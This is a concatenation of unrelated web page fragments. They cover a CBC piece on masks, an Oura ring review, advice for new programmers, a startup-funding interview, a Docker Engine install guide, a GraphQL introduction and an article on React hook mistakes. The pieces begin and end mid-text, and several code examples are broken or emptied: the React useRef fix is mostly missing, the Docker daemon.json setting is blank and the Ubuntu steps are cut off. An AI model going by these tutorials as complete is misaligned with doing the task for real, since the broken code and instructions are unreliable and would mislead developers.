"as opposed to the 600 or so that we've had from the community."&nbsp;</p>  <p><span><figure><div><p><img alt=""

avoid another lockdown</h2>  <p>"If we're opening up our economy, that implicitly says we're going to be having more contacts with each other. So a way to counterbalance that is by decreasing the probability of transmission per contact," said Fisman.</p>  <p>Fisman said masks can reduce the risk of a person getting infected by someone else, but more importantly with COVID-19, they also make it less likely that an infected person will pass on the virus.&nbsp;</p>  <p>Fisman told <a href="https://www.cbc.ca/radio/quirks"><em>Quirks &amp; Quarks</em></a> host Bob McDonald about <a href="https://www.iza.org/publications/dp/13319/face-masks-considerably-reduce-covid-19-cases-in-germany-a-synthetic-control-method-approach" target="_blank">a study</a> from &nbsp;Germany that looked at effectiveness of mandatory mask use, which they rolled out at different times in different regions.</p>  <p>He said mask use "almost acts like a shock in these models. They introduce the masks and bang — a week later, transmission is down."</p>  <p>This is why Fisman co-authored <a href="https://docs.google.com/document/u/1/d/1uUGoH0MsUwmlnOwQbbhyyRh8y4wQhG3SkFs3M-8CjEk/mobilebasic" target="_blank">an open letter</a> to federal and Ontario provincial public health officials calling on them to mandate mask wearing in certain situations, so we can open up the economy while still protecting ourselves.&nbsp;</p>  <p>If, as we open up the economy, the virus starts spreading out of control again like it did prior to the lockdown, then Fisman said masks likely wouldn't be enough to halt the spread and to prevent us from tipping over into exponential growth. For that, he said, we needed a lockdown.&nbsp;</p>  <p><em>Produced and written by <a href="https://twitter.com/SonyaBuyting" target="_blank">Sonya Buyting</a></em></p></span></p></div></div>]]>

<p>I have been using the <a href="https://ouraring.com/">Oura sleep tracking ring</a> for almost two years now. I immediately fell in love with the form factor, as I can’t stand watches or bracelets.</p>



<div><figure><a href="https://ouraring.com/"><img src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;ssl=1" alt="" width="256" height="156" srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" sizes="(max-width: 256px) 100vw, 256px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?w=1024&amp;ssl=1 1024w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=300%2C183&amp;ssl=1 300w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=768%2C469&amp;ssl=1 768w, https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=850%2C519&amp;ssl=1 850w" data-lazy-src="https://i1.wp.com/remo.org/wp-content/uploads/2020/06/oura-ring.png?resize=256%2C156&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure></div>



<h2>When do I wear it?</h2>



<p>I used to wear it all the time, but then switched to night-only. I’m not interested in tracking my steps or any of the other activity features. </p>



<p>It also provides an interesting airport security case study: </p>



<p>Turns out that airport security doesn’t care about the Oura ring. Every time I try to put it off, they say “no no, keep the ring on”, and it never beeped or anything, even though it’s an electronic device.</p>



<h2>Main use cases?</h2>



<p>I mainly use it to observe my body temperature at night. It’s a great early warning system for infections.</p>



<p>Also for my “readiness”. It indicates how restful my night was, informing the intensity of my workouts. I‘ve especially found that “low readiness” combined with an “intense workout” is a really bad combination. Instead I use the earliest signs to „listen to my body“</p>



<p>Another important factor is seeing if I got enough REM sleep.</p>



<h2>What have I learned so far?</h2>



<p>I’ve learned that <a href="https://remo.org/2020/05/28/bedtime/" data-type="1791">time in bed doesn’t equal time asleep</a>. Just because you’ve been in bed for 7 hours doesn’t mean you slept for 7 hours. It’s more likely that you slept 6. Based on my ring, my own difference is 30 to 60 minutes per night.</p>



<p>I’ve also learned more about my sleep cycle. For the first few hours, my body focuses on deep sleep. Towards the morning, the focus is shifted to REM sleep. To feel fully rested, I both need enough deep as well as REM sleep. Especially the REM sleep seems to be the most important factor for me.</p>



<h2>Sick vs. Healthy</h2>



<p>Here is a comparison between me being sick and healthy. Your sleep quality is always summarized into a “readiness” score, which makes it easily comparable.</p>

<h2>How accurate is it?</h2>



<p>At the time I bought the ring, author of <a href="https://www.amazon.de/Why-We-Sleep-Science-Dreams/dp/0141983760/ref=sr_1_1?ie=UTF8&amp;qid=1534409176&amp;sr=8-1&amp;keywords=why+we+sleep&amp;tag=remouherek-21">Why We Sleep</a>, Matthew Walker, has said that this ring was probably the most accurate sleep tracking device for retail consumers. As I loved Matthew’s book, I trust his judgement.</p>



<h2>Hardware</h2>



<p>The battery lasts for 5-7 days, which is fine. The ring does introduce a new charging device to your life—but I guess we got used to charging device inflation, right?</p>



<p>I also like that the ring is waterproof, so you can wash your hands with it, or take a shower. </p>



<p>After 9 months, I had to have my ring replaced on warranty, because the battery life dropped to 1-2 days, and the whole process was very smooth. I never had any problems with my second ring.</p>



<h2>Software</h2>



<p>I love the mobile app. The ring connects via bluetooth and the syncing takes about 20 seconds. The ring receives regular firmware updates, which are also performed through the app.</p>



<h2>Conclusion</h2>



<p>If you care about your sleep and health, I highly recommend using the <a href="https://ouraring.com/">Oura ring</a>.</p>



<p>As a last comment, I strongly believe that the company should be acquired by Apple, as I believe that it would fit nicely into the Apple wearables ecosystem and provide a wonderful new form factor.</p>

<p><em>You can find the first article in the series <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-to-program/">here</a>.</em></p>
<p><em>And the previous article <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-3/">here</a></em></p>
<h2 id="lovemaintenanceworkoratleastlearntoappreciateit">Love maintenance work or at least learn to appreciate it</h2>
<p>Very few things are more despised by programmers than doing maintenance work and working with legacy apps.</p>
<p>This can be counterproductive, as most of the work available involves doing exactly that. Companies have running systems, some built a long time ago, and someone needs to maintain that code. This is especially true if you are starting at an entry position, where you'll most likely work on some old application the company has been running for more than a decade.</p>
<p>We love working on new projects for several reasons:</p>
<ul>
<li>We can choose which technology to use.</li>
<li>We can flex our creatives muscles and create something cool.</li>
<li>There's a lot of freedom when designing the solution.</li>
<li>You get to work on The Next Big Thing and all the credit it carries.</li>
</ul>
<p>The huge difference between how we perceive maintenance work and new project development is a sad thing. On one hand, most of the really important job with high impact happens on those legacy systems, whereas The Next Big Thing often goes bust. On the other hand, that cool new app will be legacy as soon as it hits production and you start receiving new requirements.</p>
<p>We should start seeing maintenance work under a more positive light. After all, most of the value provided to end users happens on those systems. We could exercise our creative muscles by refactoring and improving the design, or increasing the test coverage, all proper challenges for developers of any level.</p>
<p>Learn to love maintenance work, it's most likely what you'll spend doing most of the time as a programmer.</p>
<h2 id="makeaccomplishmentsvisible">Make accomplishments visible</h2>
<p>You are an awesome developer, always finishing tasks on time, writing ultra-complete test suites and providing to customers exactly what they want. You do a great job every day and work extra hard to ship those last-minute features. Then, that time of the year when promotions are given arrives and you... you are still in the same position?</p>
<p>I know it can be extremely frustrating, and you might end up resenting management. After all, aren't you always doing an outstanding job? how dare they pass this chance to show me how much they appreciate my hard work!</p>
<p>In reality, managers are just too busy to keep track of your accomplishments. It's your responsibility to make your contribution visible to management.</p>
<p>It doesn't even require too much effort. Keep a list of the most important things you accomplish every week, and send small reports at the end of the week listing what you accomplished. You don't need to generate a fancy document: an email with bullet points will do.</p>
<p>It has two important advantages:</p>
<ul>
<li>Management doesn't need to pester you to get an idea of what you are doing at work.</li>
<li>You keep a registry of your accomplishments, which is useful for negotiating raises and other things.</li>
</ul>
<p>Take a proactive stance on the way management evaluates you, one of the biggest mistakes you can make is to outsource that responsibility to people who are already too busy with other things. Management will appreciate it, and so will you.</p>
<h2 id="fighttheimpostersyndrome">Fight the imposter syndrome</h2>
<p>Congratulations!</p>
<p>You got your first software development job. The idea of being interviewed made you feel very anxious, but you studied hard and aced the whole thing. Finally, you arrive at the office on your first day and...</p>
<p>And it's terrifying. Suddenly, you feel like a Jon Snow who knows nothing, and self-doubt starts to creep in. What if they find out I am not that smart? do I really deserve this job? am I a fraud? how long will it take them before they find out I'm a fraud and the horrible mistake they made by hiring me?</p>
<p>The following weeks don't help that much. Perhaps it's a technology you are not that familiar with, or maybe they ask you to work on some dark corner of their massive legacy application. Solving the tasks take you twice (or more) as long as the estimate, and you grow more and more anxious.</p>
<p>Been there, more than once.</p>
<p>It's all normal, the good old imposter syndrome. It's this feeling that you are fake, and that you don't deserve to be there. It will go away after a couple of weeks and you'll start to feel more confident. Ramp-up takes time, and in truth, no one really expects you to be 100% productive from the start. Your employer knows it will take some months before you know what you are doing, so don't punish yourself that hard.</p>
<p>Keep working hard, in no time you will become an important part of the team and your contributions will start to have an impact. We've all felt it, and I guarantee you it will go away. So keep up the good work!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
<p>There are countless articles on the web that talk about what investors look for when funding your&nbsp;startup. Normally they all focus on similar things:</p>
<ul>
<li>A stunning pitch deck</li>
<li>Solid financials</li>
<li>Market opportunity</li>
<li>A founding team with the “X-Factor”</li>
<li>Execution capability</li>
</ul>
<p>All of which are, undeniably, important. But even if you<em> think </em>you have everything figured out, the numbers don’t lie. Few startups successfully raise capital and <a href="https://altar.io/raising-capital-for-a-startup-first-steps-to-a-great-deal/" target="_blank" rel="noopener noreferrer" data-href="https://altar.io/raising-capital-for-a-startup-first-steps-to-a-great-deal/">even fewer get a good deal</a>.</p>
<p>So what’s different for the founders that do secure funding? What secrets do they know that the rest are oblivious to?</p>
<p>To find out, I sat down (virtually) with Startup expert <a href="https://www.linkedin.com/in/paulobrien/" target="_blank" rel="noopener noreferrer" data-href="https://www.linkedin.com/in/paulobrien/">Paul O’Brien</a>, CEO of <a href="https://mediatech.ventures/" target="_blank" rel="noopener noreferrer" data-href="https://mediatech.ventures/">MediaTech Ventures</a>, to take a closer look at the hidden details behind startup funding and the information you absolutely need to know that often lurks beneath the surface.</p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*o6iG3lyonjpbkc8D" alt="Expert Interview: The Hidden Details When Funding Your Startup - Paul O'Brien, CEO MediaTech Ventures #1" width="720" height="479" data-image-id="0*o6iG3lyonjpbkc8D" data-width="1440" data-height="958"></figure>
<h3>About Paul&nbsp;O’Brien</h3>
<h4>Q: Can you tell us a bit about yourself and what you&nbsp;do</h4>
<p><strong>A: </strong>I grew up in the midwest of the United States when the economy was rough there. Then I ended up in Silicon Valley when Yahoo, Google &amp; Facebook emerged so I’ve experienced both sides of an economy. And how an economy, how a workforce and how entrepreneurs can actually suffer if there isn’t an intentional investment in the entire ecosystem, the entire economy.</p>
<p>So I live now in Austin, Texas. And as the United States is shifting — because of cost it’s shifting a lot of attention from the coasts to other parts of the world. Most of that in the US is coming to Texas. So <a href="https://www.cnbc.com/2016/08/11/austin-is-top-place-for-startups-in-america-not-silicon-valley.html" target="_blank" rel="noopener noreferrer" data-href="https://www.cnbc.com/2016/08/11/austin-is-top-place-for-startups-in-america-not-silicon-valley.html">Texas is largely considered a future hub of innovation</a> for the entire US, and frankly the entire world.</p>
<p>And so here, now, I serve that economic development to help venture capital make more meaningful investments in innovation. I do that very distinctly in the media industry. We focus on everything from podcasting technology to the next Hulu, to the next Spotify, to what’s going on in the video gaming business.</p>
<h4>Q: How long have you been advising startups on investment and economic&nbsp;growth?</h4>
<p><strong>A: </strong>I’ve been doing this work in a broad sense for, [smiles] how old am I, maybe about 20 years back in Silicon Valley. I started my career at Yahoo and so essentially when I was done with Yahoo I worked with Hewlett Packard for a couple of years. And then I started working with startups so it’s been quite a while that I’ve been working with startups seeking Venture Capital funding in particular.</p>
<p><strong>Related</strong>: <a href="https://altar.io/startup-series-funding-everything-you-need-to-know/" target="_blank" rel="noopener noreferrer">Startup Series Funding: Everything You Need To Know</a></p>
<h4>Q: Do you focus on Pre-Revenue or Post-Revenue Startups?</h4>
<p><strong>A: </strong>They are very<em> very</em> different areas of focus. I think the mistake that most founders and service providers make is they treat startups as though pre-revenue and post-revenue work, mentorship, and priorities are all the same. They’re not.</p>
<p>What we do at MediaTech Ventures is we work through incubators, and we run an incubator of our own, to work with that pre-revenue sort of “Seed stage”. What I mean by that is we work to develop methodologies for programs, companies, and even cities and countries, that enable us all to better support those early founders at scale.</p>
<p>Frankly, most founders and most startups at that earlier stage all tend to need the same advice and direction, maybe with some nuance [smiles]. But frankly, that <strong>early-stage tends to have all of the same issues</strong>.</p>
<p>I more personally work at the later stage, essentially the Series A &amp; Series B stage which is why we use the word venture capital so distinctly. I tend to work with Venture Capital funds and firms and<em> their </em>interests in particular. And, of course, VCs don’t participate at the seed stage and hence they’re very different stages to be working. I tend not to work beyond that. I don’t work Series C, I don’t work very much with larger companies or in M &amp; A (Mergers &amp; Acquisitions).</p>
<h3><em><span>“I think the mistake that most founders and service providers make is they treat startups as though pre-revenue and post-revenue work, mentorship and priorities are all the same. They’re&nbsp;not.”</span></em></h3>
<h4>Q: So your main focus is VC, but do you also make introductions to Angel Investors &amp; Private&nbsp;Equity?</h4>
<p><strong>A: </strong>Yes, our main focus is Venture Capital funding, and not because we can’t work with others. Certainly, private equity participates at every stage, mostly later stage but really every stage.</p>
<p>The distinct difference, of course, is that a Venture Capital firm and a fund has a fiduciary responsibility to invest. That’s why <em>the thing </em>exists, they’re obligated to invest. And the partners there have no choice. The limited partners don’t give money to a Venture Capital fund just to sit on it. So it’s a very distinct stage and tends to focus at the middle.</p>
<p>Private Equity is very different because, of course, private equity can do whatever it wants! [laughs] It can completely ignore startups if they’d like to. So, I tend not to work there just because private equity has too many differences, too many nuances.</p>
<p>I work with private equity <strong>as it pertains to our sector, to our industry in particular</strong>. So we work with a lot of media industry private equity. But unless they’re focused on the media industry, we don’t bother. Because they can be all over the place. Whereas Venture Capitalists tend to have all the same expectations at a certain stage.</p>
<p>To answer the question more explicitly we tend not to make introductions to Angels because of our thesis on how best to do that and how that should work. We do make introductions to Venture Capitalists. We don’t broker deals, I don’t believe in getting paid a percentage of equity to connect VCs. We certainly do make introductions, I believe that startups that are worth being funded ethically deserve to be known to investors who want to invest in startups. So we try not to monetise that happening and we make introductions as best we can at the venture capital stage.</p>
<p>What we do at the angel stage, or seed stage is actually the opposite. We have a database of a lot of seed-stage media startups and instead,<strong> we enable the Angel community to actually see that a little bit more transparently</strong>. So basically instead of introducing Angels, because of our thesis about how and why to connect with Angels, we instead more <strong>aggressively promote and expose what seed-stage startups are doing</strong> so that angels are aware of it and consider them if they want to.</p>

<h3>The Hidden Details When Funding Your Startup</h3>
<h4>Q: An early-stage startup has a lot to do and one of the things you need is capital. Do you think it’s meaningful to have investors on board who are experts in startups and/or a specific sector and can provide connections (Smart Money)? Or do you just need someone who can give you a cash injection?</h4>
<p><strong>A: </strong>It’s a great question. That’s a question that I talk about nearly every day with people. Here’s Why:</p>
<p>First, you have to distinguish a <strong>startup </strong>from a <strong>new business</strong>. A new business is not a startup. A new business knows its business model. A new business can make money <em>right now</em>. A new business, a restaurant or an agency, for example, is not a startup. They can go and sell to customers immediately. And in that context, your clarification makes some sense. Should you go talk to a bank? Yeah! Of course! [laughs] Should you find a business partner who’s an investor? Absolutely! Because we can go capitalise this business and make money with it right now.</p>
<p>Startups are<em> not at all</em> the same thing. And it’s very important that the industry, and the world, <strong>appreciate the distinction</strong>. It tends not to because the word “startup” is very popular. Everybody wants to call themselves a startup because it’s sexy. But we can’t! It’s not the same thing. A startup does not know its business model — <strong>a startup by definition does not know how to make money</strong>. And there’s nothing wrong with that — that’s the definition of a startup: “I have an idea, I have a technology, I have a patent, I have something with which I cannot make money right now because I don’t know how to yet. We haven’t figured out how to yet.”</p>
<h3><em><span>“A new business is not a startup. And it’s very important that the industry, and the world, appreciate the distinction. It tends not to because the word “startup” is very popular. Everybody wants to call themselves a startup because it’s sexy. But we can’t! It’s not the same&nbsp;thing.”</span></em></h3>
<p>My favourite example of that is something that recently happened: <strong>ridesharing</strong>.</p>
<p>Lyft was <em>not</em> a startup (at least not the way most should think of it as one). We called it a startup but it wasn’t. Because the startup in ridesharing occurred years before that.</p>
<p>Lyft was the <strong>second mover — “A</strong> <strong>new business in ridesharing”</strong>. So Lyft was <em>definitely </em>not a startup because they looked at what Uber did and just did the same thing. And, of course, throughout the world, we have a bunch of people trying to create ridesharing apps and local businesses for ridesharing. None of those are startups because we already know <strong>how the business of ridesharing works</strong>.</p>
<p>So, a startup <strong>being net new</strong>, always… <em>always</em> the biggest mistake founders make is they try to raise capital to start. Here’s the bottom line:<strong> no startup in the history of the world can raise money just to get going. </strong>Unless you’re Elon Musk, unless you’re Mark Zuckerberg, no one is going to give anybody money just to start something.</p>
<p>So startup finance<em> has</em> to start with:</p>
<ol>
<li>Their own savings</li>
<li>Their own debt</li>
<li>Friends and family</li>
</ol>
<p>Period. The research is there, the reason the average age of success for a startup founder is <a href="https://altar.io/managers-improve-become-successful-entrepreneurs/" target="_blank" rel="noopener noreferrer" data-href="https://altar.io/managers-improve-become-successful-entrepreneurs/">45 years old, <strong>and not 20</strong>,</a> is that they have savings and have money to spend. Period.</p>
<h3><em><span>“No startup in the history of the world can raise money just to get going. Unless you’re Elon Musk, unless you’re Mark Zuckerberg, no one is going to give anybody money just to start something.”</span></em></h3>
<h4>Q: That’s really interesting, there’s a couple of examples that are a bit different that might change the …</h4></article></div></div>

  <p>Install and upgrade of Docker Engine is simple and straightforward process.</p>
<p>In this post I will cover all important information in one place.</p>

<p>Minimum requirements</p>
<ul>
<li>8GB RAM per manager node</li>
<li>4GB RAM per worker node</li>
<li>3GB of free disk space</li>
</ul>
<p>Recommended production requirements</p>
<ul>
<li>16GB RAM per manager node</li>
<li>4 vCPUs per manager node</li>
<li>25-100GB of free disk space on each node</li>
</ul>
<p>Also you must have one of the following OS:</p>
<ul>
<li>CentOS 7.1+ 64 bit version</li>
<li>Ubuntu 16.04/18.04/19.10 64 bit versions</li>
</ul>
<p>Preferable storage driver on newer OS is <code>overlay2</code>.<br>
Docker engine will set it by default.</p>
<p>If you want to get to know what is storage driver, what storage drivers are advised on certain OS and how to change it or looking for detailed info about setup of devicemapper, look at:</p>
<p><a href="https://knowledgepill.it/posts/docker_storage_drivers/">Docker storage driver - guide </a><br>
<a href="https://knowledgepill.it/posts/docker_configure_devicemapper/">Docker devicemapper - setup</a></p>
<hr>
<h5 id="important">Important</h5>
<p>If you plan to use Docker Enterprise with multiple nodes or Swarm - remember to set up time synchro between nodes - use NTP for that.</p>
<hr>

<ul>
<li>Ensure that <code>centos-extras</code> repo is enabled</li>
<li>Install <code>yum-utils</code>:</li>
</ul>
<ul>
<li>Add repo</li>
</ul>
<div><pre><code data-lang="bash">yum-config-manager <span>\
</span><span></span>  --add-repo <span>\
</span><span></span>  https://download.docker.com/linux/centos/docker-ce.repo
</code></pre></div><ul>
<li>Install docker engine(Valid GPG Key: <code>060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35</code>)</li>
</ul>
<div><pre><code data-lang="bash">yum install docker-ce docker-ce-cli containerd.io
</code></pre></div><p>CentOS 8 at day of writing this post has problem with dependiences for containerd.io - you can solve this by installing manually correct version of containerd.io before running <code>docker-ce</code> instalation command. Example</p>
<div><pre><code data-lang="bash">yum install https://download.docker.com/linux/centos/7/x86_64/stable/Packages/containerd.io-1.2.6-3.3.el7.x86_64.rpm
</code></pre></div><ul>
<li>Start and enable autostart of daemon:</li>
</ul>
<div><pre><code data-lang="bash">systemctl start docker
systemctl enable docker
</code></pre></div><p>Optionally you can list available versions of docker and install preferable one:</p>
<div><pre><code data-lang="bash">yum list docker-ce --showduplicates | sort -r
</code></pre></div><div><pre><code data-lang="bash"> yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io
</code></pre></div><hr>
<p>For installing Docker Enterprise Edition you have to set up repo on your OS after getting from <a href="https://hub.docker.com/my-content">Docker Hub Account</a> Docker EE Repo Adress.</p>
<hr>

<ul>
<li>Update system and install important packages</li>

<p>If you want that running containers won’t stop with docker daemon you can enable live restore feature. After enabling it you can perform upgrade of docker engine without stopping running containers.</p>
<p>In <code>/etc/docker/daemon.json</code> set:</p>
<p>Upgrade on CentOS or Ubuntu - if we install docker engine from repo - can be performed with simple <code>yum upgrade</code> or <code>apt-get upgrade</code> commands.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>
<li><em>GraphQL Mutations</em> - mutations are used to write or post values.</li>
</ul>

    </span></p>
<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>

<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>React as a framework</h2>
<p>React has been out in the world of web development for quite some time now and its position as a tool for agile web development has steadily strengthened in recent years. Especially after the announcement and release of the <a href="https://reactjs.org/docs/hooks-state.html#hooks-and-function-components">new hook api/concept</a>, writing components has never been easier.</p>
<p>Although the team behind react and the huge community have tried to train and explain the concepts of the framework in an impressive way, I still see some pitfalls and common mistakes that were made while working with it.
I kept a list of all the mistakes I saw over the last years related to react especially with using hooks. In this article I want to show you the most common ones and I will also try to explain in detail, why I think they are mistakes and a suggestion for doing it in a cleaner way.</p>
<h3>Disclaimer</h3>
<p>Before we start with the list, I have to say that most of the following things are not fundamental mistakes or don't look wrong at first glance, and also most of them are unlikely to affect the performance or apperance of the application.
Probably nobody would notice, except for the developers working on the product, that something is wrong here, but I still believe that good quality code can lead to a better developer experience and thus to a better product.</p>
<p>As with any software framework or library, there are millions of different opinions about it. Everything you see here is based on my personal opinion and should not be considered a general rule.
If you have a different opinion about her, I would love to hear it 🌟</p>
<h2>1. Using useState when no rerender is needed</h2>
<p>One of the core concepts of react is dealing with state. You can control your entire data flow and rendering through the state. Each time the tree is rendered again, it is most likely tied to a change in the state.</p>
<p>With the <code>useState</code> hook you can now also define your state in function components, which is a really neat and easy way how to handle states in react. But it can also be misused as we see in the following example.</p>
<p>For the next example we need a bit of explanation, suppose we have two buttons, one button is a counter and the other button sends a request or triggers an action with the current count. However, the current number is never displayed within the component. It is only required for the request when you click the second button.</p>

<h3>The problem ⚡</h3>
<p>At the first sight, you might ask what is exactly the problem with that? Isn't what what the state was made for?
Sure you are right, this will work just fine and probably there will be never a problem with that, however in react every state change will force a rerender for that component and most likely its children, but in the above example since we never use that state in our render part, this will end up being an unnecessary render every time we set the counter, which can impact the performance or could have unexpected side effects.</p>
<h3>The solution ✅</h3>
<p>If you want to use a variable inside your component which should keep its value between rendering but also don't force a rerender, you can use the <code>useRef</code> hook. It will keep the value, but doesn't force the component to rerender.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>

  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
</div><div>
<h2>2. Using router.push instead of a link</h2>
<p>This might be a very easy and obvious one and not really related to react itself, but I still see it quite a lot when people writing react components.</p>
<p>Let's say you will write a button and with clicking the button the user should be redirected to another page. Since its a <a href="https://en.wikipedia.org/wiki/Single-page_application">SPA</a>, this action will be a client-side routing mechanism. So you will need some kind of library for doing that.
In react the most popular one is <a href="https://reacttraining.com/react-router/">react-router</a> and the following example will use that library.</p>
<p>So adding a click listener will redirect the user to the desired page right?</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>const</span> history <span>=</span> <span>useHistory</span><span>(</span><span>)</span><span>;</span>

  <span>const</span> <span>onClick</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    history<span>.</span><span>push</span><span>(</span><span>'/next-page'</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>

  <span>return</span> <span><span><span>&lt;</span>button</span> <span>onClick</span><span><span>=</span><span>{</span>onClick<span>}</span></span><span>&gt;</span></span><span>Go to next page</span><span><span><span>&lt;/</span>button</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>Even though this would work just fine for most of the users, there is huge problem when it comes to accessibility here. The button will not be marked as linking to another page at all, which makes it nearly impossible to be identified by screen readers.
Also could you open that in a new tab or window? Most likely not.</p>
<h3>The solution ✅</h3>
<p>Linking to other pages with any user interaction should as far as possible be handled by the <code>&lt;Link&gt;</code> component or a normal <code>&lt;a&gt;</code> tag.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>ClickButton</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Link</span></span> <span>to</span><span><span>=</span><span>"</span>/next-page<span>"</span></span><span>&gt;</span></span><span>
      </span><span><span><span>&lt;</span>span</span><span>&gt;</span></span><span>Go to next page</span><span><span><span>&lt;/</span>span</span><span>&gt;</span></span><span>
    </span><span><span><span>&lt;/</span><span>Link</span></span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p><strong>Bonus points:</strong> it also makes the code a lot more readable and shorter!</p>
<h2>3. Handling actions via useEffect</h2>
<p>One of the best and most thoughtful hooks introduced by React is the "useEffect" hook. It enables the processing of actions related to <code>prop</code> or <code>state</code> changes.
Despite its helpful functionality, it is also often used in places where it may not be needed.</p>
<p>Imagine a component that fetches a list of items and render them to the dom. In addition, if the request is successful, we would like to call the "onSuccess" function, which is passed on to the component as a prop</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>DataList</span><span>(</span><span><span>{</span> onSuccess <span>}</span></span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>loading<span>,</span> setLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>data<span>,</span> setData<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>

  <span>const</span> fetchData <span>=</span> <span>useCallback</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setLoading</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>callApi</span><span>(</span><span>)</span>
      <span>.</span><span>then</span><span>(</span><span>(</span><span>res</span><span>)</span> <span>=&gt;</span> <span>setData</span><span>(</span>res<span>)</span><span>)</span>
      <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>setError</span><span>(</span>err<span>)</span><span>)</span>
      <span>.</span><span>finally</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setLoading</span><span>(</span><span>false</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fetchData</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>fetchData<span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>loading <span>&amp;&amp;</span> <span>!</span>error <span>&amp;&amp;</span> data<span>)</span> <span>{</span>
<span>      <span>onSuccess</span><span>(</span><span>)</span><span>;</span></span>    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>loading<span>,</span> error<span>,</span> data<span>,</span> onSuccess<span>]</span><span>)</span><span>;</span>

